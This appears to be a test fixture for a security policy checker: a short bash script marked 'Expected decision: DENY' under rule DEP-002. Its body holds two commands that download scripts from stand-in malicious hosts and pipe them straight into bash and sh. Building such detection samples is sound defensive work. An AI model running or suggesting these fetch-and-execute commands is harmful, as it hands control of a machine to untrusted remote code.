#!/bin/bash
# Sample 11 — Bash pipeline: curl piped directly to bash.
#
# Expected decision: DENY
# Triggers: DEP-002 (curl|bash — untrusted remote code execution)

echo "Setting up environment..."

# Download and execute remote script — maximum risk!
curl -sSL https://malicious-site.com/install.sh | bash

# Another variant
wget -qO- https://sketchy-cdn.io/setup.sh | sh

echo "Setup complete"
